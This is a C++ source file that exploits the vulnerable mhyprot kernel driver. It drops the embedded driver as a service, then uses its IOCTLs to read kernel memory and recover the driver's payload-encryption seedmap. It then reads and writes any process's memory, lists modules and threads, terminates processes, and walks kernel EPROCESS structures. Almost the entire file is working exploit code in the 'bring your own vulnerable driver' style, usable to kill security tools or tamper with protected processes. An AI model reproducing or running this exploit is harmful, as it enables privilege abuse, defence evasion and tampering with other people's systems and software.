/*
 * MIT License
 *
 * Copyright (c) 2020 Kento Oki
 *
 * Permission is hereby granted, free of charge, to any person obtaining a copy
 * of this software and associated documentation files (the "Software"), to deal
 * in the Software without restriction, including without limitation the rights
 * to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
 * copies of the Software, and to permit persons to whom the Software is
 * furnished to do so, subject to the following conditions:
 *
 * The above copyright notice and this permission notice shall be included in all
 * copies or substantial portions of the Software.
 *
 * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
 * IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
 * FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
 * AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
 * LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
 * OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
 * SOFTWARE.
 *
 */

#include "mhyprot.hpp"
#include <map>

#define MAX_VIRTUAL_USERMODE 0x7FFFFFFFFFFF
#define MIN_VIRTUAL_USERMODE 0x10000

 //
 // initialization of its service and device
 //
bool mhyprot::init()
{
    char temp_path[MAX_PATH];
    const uint32_t length = GetTempPath(sizeof(temp_path), temp_path);

    if (length > MAX_PATH || !length)
    {
        return false;
    }

    //
    // place the driver binary into the temp path
    //
    const std::string placement_path = std::string(temp_path) + MHYPROT_SYSFILE_NAME;

    if (std::filesystem::exists(placement_path))
    {
        std::remove(placement_path.c_str());
    }

    SC_HANDLE service = service_utils::get_service(MHYPROT_SERVICE_NAME);
    if (service != NULL) {
        printf("Service already exist\n");
        if (!service_utils::stop_service(service)) {
            printf("failed to stop service\n");
        };
        if (!service_utils::delete_service(service)) {
            printf("failed to delete service\n");
        }
    }
    printf("Existing service check passed\n");

    //
    // create driver sys from memory
    //
    if (!file_utils::create_file_from_buffer(
        placement_path,
        (void*)resource::raw_driver,
        sizeof(resource::raw_driver)
    ))
    {
        printf("failed to create file from buffer\n");
        return false;
    }



    //
    // create service using winapi, this needs administrator privileage
    //
    detail::mhyplot_service_handle = service_utils::create_service(placement_path);

    if (!CHECK_HANDLE(detail::mhyplot_service_handle))
    {
        printf("Create Service failed, no admin priv or already exist\n");
        return false;
    }

    //
    // start the service
    //
    if (!service_utils::start_service(detail::mhyplot_service_handle))
    {
        return false;
    }

    //
    // open the handle of its driver device
    //
    detail::device_handle = CreateFile(
        TEXT(MHYPROT_DEVICE_NAME),
        GENERIC_READ | GENERIC_WRITE,
        0,
        nullptr,
        OPEN_EXISTING,
        NULL,
        NULL
    );

    if (!CHECK_HANDLE(detail::device_handle))
    {
        return false;
    }

    return true;
}

void mhyprot::unload()
{
    if (detail::device_handle)
    {
        CloseHandle(detail::device_handle);
    }

    if (detail::mhyplot_service_handle)
    {
        service_utils::stop_service(detail::mhyplot_service_handle);
        service_utils::delete_service(detail::mhyplot_service_handle);
    }
}

//
// send ioctl request to the vulnerable driver
//
bool mhyprot::driver_impl::request_ioctl(
    DWORD ioctl_code, LPVOID in_buffer, DWORD in_buffer_size
)
{
    //
    // allocate memory for this command result
    //
    LPVOID out_buffer = calloc(1, in_buffer_size);
    DWORD out_buffer_size;

    if (!out_buffer)
    {
        return false;
    }

    //
    // send the ioctl request
    //
    const bool result = DeviceIoControl(
        mhyprot::detail::device_handle,
        ioctl_code,
        in_buffer,
        in_buffer_size,
        out_buffer,
        in_buffer_size,
        &out_buffer_size,
        NULL
    );

    //
    // store the result
    //
    if (out_buffer_size)
    {
        memcpy(in_buffer, out_buffer, out_buffer_size);
    }

    free(out_buffer);

    return result;
}

//
// initialize driver implementations with payload encryption requirements
//
bool mhyprot::driver_impl::driver_init()
{
    //
    // the driver initializer
    //
    MHYPROT_INITIALIZE initializer;
    initializer._m_001 = GetCurrentProcessId();
    initializer._m_002 = 0x0BAEBAEEC;
    initializer._m_003 = 0x0EBBAAEF4FFF89042;

    printf("protecting %d\n", initializer._m_001);

    if (!request_ioctl(MHYPROT_IOCTL_INITIALIZE, &initializer, sizeof(initializer)))
    {
        return false;
    }

    //
    // driver's base address in the system
    //
    uint64_t mhyprot_address = win_utils::find_sysmodule_address(MHYPROT_SYSFILE_NAME);

    if (!mhyprot_address)
    {
        return false;
    }

    //
    // read the pointer that points to the seedmap that used to encrypt payloads
    // the pointer on the [driver.sys + 0xA0E8]
    //
    uint64_t seedmap_address = driver_impl::
        read_kernel_memory
        <uint64_t>(mhyprot_address + MHYPROT_OFFSET_SEEDMAP);

    if (!seedmap_address)
    {
        return false;
    }

    //
    // read the entire seedmap as size of 0x9C0
    //
    if (!driver_impl::read_kernel_memory(
        seedmap_address,
        &detail::seedmap,
        sizeof(detail::seedmap)
    ))
    {
        return false;
    }

    return true;
}

//
// encrypt the payload
//
void mhyprot::driver_impl::encrypt_payload(void* payload, size_t size)
{
    if (size % 8)
    {
        return;
    }

    if (size / 8 >= 312)
    {
        return;
    }

    uint64_t* p_payload = (uint64_t*)payload;
    DWORD64 key_to_base = 0;

    for (DWORD i = 1; i < size / 8; i++)
    {
        const uint64_t key = generate_key(detail::seedmap[i - 1]);
        p_payload[i] = p_payload[i] ^ key ^ (key_to_base + p_payload[0]);
        key_to_base += 0x10;
    }
}

//
// read memory from the kernel using vulnerable ioctl
//
bool mhyprot::driver_impl::read_kernel_memory(
    const uint64_t& address, void* buffer, const size_t& size
)
{
    if (!buffer)
    {
        return false;
    }

    DWORD payload_size = size + sizeof(DWORD);
    PMHYPROT_KERNEL_READ_REQUEST payload = (PMHYPROT_KERNEL_READ_REQUEST)calloc(1, payload_size);

    if (!payload)
    {
        return false;
    }

    payload->address = address;
    payload->size = size;
    if (!request_ioctl(MHYPROT_IOCTL_READ_KERNEL_MEMORY, payload, payload_size))
    {
        return false;
    }

    //
    // result will be overrided in first 4bytes of the payload
    //
    if (!*(uint32_t*)payload)
    {
        memcpy(buffer, (PUCHAR)payload + 4, size);
        return true;
    }

    return false;
}

//
// read specific process memory from the kernel using vulnerable ioctl
// let the driver to execute MmCopyVirtualMemory
//
bool mhyprot::driver_impl::read_process_memory(
    const uint32_t process_id,
    const uint64_t address, void* buffer, const size_t size
)
{
    if (address > MAX_VIRTUAL_USERMODE || address < MIN_VIRTUAL_USERMODE ||
        (uint64_t)buffer > MAX_VIRTUAL_USERMODE || (uint64_t)buffer < MIN_VIRTUAL_USERMODE) {
        printf("bad address access %llx\n", address);
        return false;
    }

    //printf("pid: %d trying to read %llx %x\n", process_id, address, size);
    MHYPROT_USER_READ_WRITE_REQUEST payload;
    payload.action = MHYPROT_ACTION_READ;   // action code
    payload.process_id = process_id;        // target process id
    payload.address = address;              // address
    payload.buffer = (uint64_t)buffer;      // our buffer
    payload.size = size;                    // size

    encrypt_payload(&payload, sizeof(payload));

    return request_ioctl(
        MHYPROT_IOCTL_READ_WRITE_USER_MEMORY,
        &payload,
        sizeof(payload)
    );
}

//
// write specific process memory from the kernel using vulnerable ioctl
// let the driver to execute MmCopyVirtualMemory
//
bool mhyprot::driver_impl::write_process_memory(
    const uint32_t& process_id,
    const uint64_t& address, void* buffer, const size_t& size
)
{
    if (address > MAX_VIRTUAL_USERMODE || address < MIN_VIRTUAL_USERMODE ||
        (uint64_t)buffer > MAX_VIRTUAL_USERMODE || (uint64_t)buffer < MIN_VIRTUAL_USERMODE) {
        printf("bad address access %llx\n", address);
        return false;
    }
    MHYPROT_USER_READ_WRITE_REQUEST payload;
    payload.action = MHYPROT_ACTION_WRITE;  // action code
    payload.process_id = process_id;        // target process id
    payload.address = (uint64_t)buffer;     // our buffer
    payload.buffer = address;               // destination
    payload.size = size;                    // size

    encrypt_payload(&payload, sizeof(payload));

    return request_ioctl(
        MHYPROT_IOCTL_READ_WRITE_USER_MEMORY,
        &payload,
        sizeof(payload)
    );
}

//
// get a number of modules that loaded in the target process
//
bool mhyprot::driver_impl::get_process_modules(
    const uint32_t& process_id, const uint32_t max_count,
    std::vector<std::pair<std::wstring, std::wstring>>& result
)
{
    //
    // return is 0x3A0 alignment
    //
    const size_t payload_context_size = static_cast<uint64_t>(max_count) * MHYPROT_ENUM_PROCESS_MODULE_SIZE;

    //
    // payload buffer must have additional size to get result(s)
    //
    const size_t alloc_size = sizeof(MHYPROT_ENUM_PROCESS_MODULES_REQUEST) + payload_context_size;

    //
    // allocate memory
    //
    PMHYPROT_ENUM_PROCESS_MODULES_REQUEST payload =
        (PMHYPROT_ENUM_PROCESS_MODULES_REQUEST)calloc(1, alloc_size);

    if (!payload)
    {
        return false;
    }

    payload->process_id = process_id;   // target process id
    payload->max_count = max_count;     // max module count to lookup

    if (!request_ioctl(MHYPROT_IOCTL_ENUM_PROCESS_MODULES, payload, alloc_size))
    {
        free(payload);
        return false;
    }

    //
    // if the request was not succeed in the driver, first 4byte of payload will be zero'ed
    //
    if (!payload->process_id)
    {
        free(payload);
        return false;
    }


    //
    // result(s) are @ + 0x2
    //
    const void* payload_context = reinterpret_cast<void*>(payload + 0x2);

    for (uint64_t offset = 0x0;
        offset < payload_context_size;
        offset += MHYPROT_ENUM_PROCESS_MODULE_SIZE)
    {
        const std::wstring module_name = reinterpret_cast<wchar_t*>((uint64_t)payload_context + offset);
        const std::wstring module_path = reinterpret_cast<wchar_t*>((uint64_t)payload_context + (offset + 0x100));

        if (module_name.empty() && module_path.empty())
            continue;

        result.push_back({ module_name, module_path });
    }

    free(payload);

    return true;
}

bool mhyprot::driver_impl::get_process_threads(
    const uint32_t& process_id, const uint32_t& owner_process_id,
    std::vector<MHYPROT_THREAD_INFORMATION>& result
)
{
    //
    // allocation size must have enough size for result
    // and the result is 0xA8 alignment
    //
    const size_t alloc_size = 50 * MHYPROT_ENUM_PROCESS_THREADS_SIZE;

    //
    // allocate memory for payload and its result
    //
    PMHYPROT_ENUM_PROCESS_THREADS_REQUEST payload =
        (PMHYPROT_ENUM_PROCESS_THREADS_REQUEST)calloc(1, alloc_size);

    if (!payload)
    {
        return false;
    }

    payload->validation_code = MHYPROT_ENUM_PROCESS_THREADS_CODE;
    payload->process_id = process_id;
    payload->owner_process_id = process_id;

    if (!request_ioctl(MHYPROT_IOCTL_ENUM_PROCESS_THREADS, payload, alloc_size))
    {
        free(payload);
        return false;
    }

    //
    // if the request succeed in the driver context,
    // a number of threads that stored in the buffer will be reported
    // in first 4byte
    //
    if (!payload->validation_code ||
        payload->validation_code <= 0 ||
        payload->validation_code > 1000)
    {
        free(payload);
        return false;
    }

    const void* payload_context = reinterpret_cast<void*>(payload + 1);

    const uint32_t thread_count = payload->validation_code;

    for (uint64_t offset = 0x0;
        offset < (MHYPROT_ENUM_PROCESS_THREADS_SIZE * thread_count);
        offset += MHYPROT_ENUM_PROCESS_THREADS_SIZE)
    {
        const auto thread_information =
            reinterpret_cast<PMHYPROT_THREAD_INFORMATION>((uint64_t)payload_context + offset);

        result.push_back(*thread_information);
    }

    free(payload);
    return true;
}

//
// get system uptime by seconds
// this eventually calls KeQueryTimeIncrement in the driver context
//
uint32_t mhyprot::driver_impl::get_system_uptime()
{
    //
    // miliseconds
    //
    uint32_t result;

    static_assert(
        sizeof(uint32_t) == 4,
        "invalid compiler specific size of uint32_t, this may cause BSOD"
        );

    if (!request_ioctl(MHYPROT_IOCTL_GET_SYSTEM_UPTIME, &result, sizeof(uint32_t)))
    {
        return -1;
    }

    //
    // convert it to the seconds
    //
    return static_cast<uint32_t>(result / 1000);
}

//
// terminate specific process by process id
// this eventually calls ZwTerminateProcess in the driver context
//
bool mhyprot::driver_impl::terminate_process(const uint32_t process_id)
{
    MHYPROT_TERMINATE_PROCESS_REQUEST payload;
    payload.process_id = process_id;

    encrypt_payload(&payload, sizeof(payload));

    if (!request_ioctl(MHYPROT_IOCTL_TERMINATE_PROCESS, &payload, sizeof(payload)))
    {
        return false;
    }

    if (!payload.response)
    {
        return false;
    }

    return true;
}

bool mhyprot::driver_impl::enable_ppl(const uint32_t process_id)
{
    /*
    PKIWI_PROCESS_SIGNATURE_PROTECTION pSignatureProtect = NULL;
    KIWI_PROCESS_SIGNATURE_PROTECTION SignatureProtection;
    SignatureProtection.SignatureLevel = 0x3f;
    SignatureProtection.SectionSignatureLevel = 0x3f;
    SignatureProtection.Protection.Type = PsProtectedTypeProtected; //Protect Process Type
    SignatureProtection.Protection.Audit = 0;
    SignatureProtection.Protection.Signer = PsProtectedSignerWinTcb;//WinTcb Åv­­
    ULONG_PTR pProcess = 0xFFFFB48EE8F00540;
    pSignatureProtect = (PKIWI_PROCESS_SIGNATURE_PROTECTION)((pProcess) + EPROCESS_OffSetTable[OsIndex][SignatureProtect]);

    pSignatureProtect->Protection = SignatureProtection.Protection;//patch EPROCESS_Protection*/
    return false;
}

using fNtQuerySystemInformation = NTSTATUS(WINAPI*)(
    ULONG SystemInformationClass,
    PVOID SystemInformation,
    ULONG SystemInformationLength,
    PULONG ReturnLength
    );

std::map<std::string, std::pair<int, int> > get_eprocess_offsets() {
    // _EPROCESS.UniqueProcessId
    // _EPROCESS.Peb (point to process VM address)
    return {
        {"2104", {0x440, 0x550}},
        {"2009", {0x440, 0x550}},
        {"2004", {0x440, 0x550}},
        {"1909", {0x2e8, 0x3f8}},
        {"1903", {0x2e8, 0x3f8}},
        {"1809", {0x2e0, 0x3f8}},
        {"1803", {0x2e0, 0x3f8}},
        {"1709", {0x2e0, 0x3f8}},
        {"1703", {0x2e0, 0x3f8}},
        {"1607", {0x2e0, 0x3f8}},
        {"1511", {0x2e0, 0x3f8}},
        {"1507", {0x2e0, 0x3f8}},
    };
}

LONG GetStringRegKey(HKEY hKey, const std::string& strValueName, std::string& strValue, const std::string& strDefaultValue)
{
    strValue = strDefaultValue;
    CHAR szBuffer[512] = { 0 };
    DWORD dwBufferSize = sizeof(szBuffer);
    ULONG nError;
    nError = RegQueryValueExA(hKey, strValueName.c_str(), 0, NULL, (PBYTE)szBuffer, &dwBufferSize);
    if (ERROR_SUCCESS == nError)
    {
        strValue = szBuffer;
    }
    return nError;
}

uint64_t mhyprot::driver_impl::get_ppeb(const uint32_t process_id)
{
    HKEY hKey;
    LONG lRes = RegOpenKeyExA(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", 0, KEY_READ, &hKey);
    std::string osid;
    GetStringRegKey(hKey, "ReleaseId", osid, "2009");

    auto offsets = get_eprocess_offsets();
    uint32_t eprocess_pid_offset = offsets[osid].first;
    uint32_t eprocess_pPEB_offset = offsets[osid].second;

    //printf("eprocess_pid_offset %lx\n", eprocess_pid_offset);
    //printf("eprocess_pPEB_offset %lx\n", eprocess_pPEB_offset);

    ULONG returnLenght = 0;
    fNtQuerySystemInformation NtQuerySystemInformation = (fNtQuerySystemInformation)GetProcAddress(GetModuleHandleW(L"ntdll"), "NtQuerySystemInformation");
    PSYSTEM_HANDLE_INFORMATION handleTableInformation = (PSYSTEM_HANDLE_INFORMATION)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, SystemHandleInformationSize);
    NtQuerySystemInformation(SystemHandleInformation, handleTableInformation, SystemHandleInformationSize, &returnLenght);

    for (int i = 0; i < handleTableInformation->NumberOfHandles; i++)
    {
        SYSTEM_HANDLE_TABLE_ENTRY_INFO handleInfo = (SYSTEM_HANDLE_TABLE_ENTRY_INFO)handleTableInformation->Handles[i];

        if (handleInfo.UniqueProcessId == 4 && handleInfo.ObjectTypeIndex == 7)
        {
            uint64_t pid = 0;
            if (!mhyprot::driver_impl::read_kernel_memory(((uint64_t)handleInfo.Object) + eprocess_pid_offset, &pid, 8)) {
                printf("Failed to read kernel\n");
            }
            uint64_t pPEB = 0;
            uint64_t imageBase = 0;
            mhyprot::driver_impl::read_kernel_memory(((uint64_t)handleInfo.Object) + eprocess_pPEB_offset, &pPEB, 8);
            if (pid == process_id && pPEB) {
                return pPEB;
            }
            //printf_s("Handle 0x%x at 0x%p, PID: %x, image base: %llx, type: %d\n", handleInfo.HandleValue, handleInfo.Object, pid, imageBase, handleInfo.ObjectTypeIndex);
        }
        else if (handleInfo.UniqueProcessId != 4)
        {
            break;
        }
    }
    return 0;
}

uint64_t mhyprot::driver_impl::get_process_module_base(const uint32_t process_id)
{
    uint64_t ppeb = get_ppeb(process_id);
    uint64_t imageBase = 0;
    mhyprot::driver_impl::read_process_memory(process_id, ((uint64_t)ppeb) + 0x10, &imageBase, 8);
    return imageBase;
}

uint64_t mhyprot::driver_impl::get_module_base(uint32_t process_id, std::wstring module_name)
{
    uint64_t ppeb = get_ppeb(process_id);
    //printf("peb at: %llx\n", ppeb);
    uint64_t pp_peb_ldr_data = (ppeb + 0x18);
    PEB_LDR_DATA ldr_data = { 0 };
    uint64_t p_peb_ldr_data;
    read_process_memory(process_id, pp_peb_ldr_data, &p_peb_ldr_data, sizeof(p_peb_ldr_data));
    //printf("p_peb_ldr_data: %llx\n", p_peb_ldr_data);
    read_process_memory(process_id, p_peb_ldr_data, &ldr_data, sizeof(ldr_data));

    //printf("ldr len: %d\n", ldr_data.Length);

    LIST_ENTRY pList = ldr_data.InLoadOrderModuleList;
    uint64_t head = (uint64_t)pList.Flink;
    do {
        printf("pList point to: %llx\n", (uint64_t)pList.Flink);
        _LDR_DATA_TABLE_ENTRY entry;
        read_process_memory(process_id, (uint64_t)pList.Flink, &entry, sizeof(entry));
        wchar_t buffer[4096 * 4];
        memset(buffer, 0, sizeof(buffer));
        read_process_memory(process_id, (uint64_t)entry.BaseDllName.Buffer, &buffer, entry.BaseDllName.Length * sizeof(wchar_t));
        //printf("length: %d\n", (uint32_t)entry.BaseDllName.Length);
        //printf("image base: %llx\n", entry.DllBase);
        //wprintf(L"dll: %s\n", buffer);

        if (lstrcmpiW(buffer, module_name.c_str()) == 0) {
            printf("found module\n");
            return (uint64_t)entry.DllBase;
        }

        pList = entry.InLoadOrderLinks;
        //printf("at end pList point to: %llx\n", (uint64_t)entry.InLoadOrderLinks.Flink);
        //printf("at end pList point to: %llx\n", (uint64_t)pList.Flink);
    } while ((uint64_t)pList.Flink != head);

    return 0;
}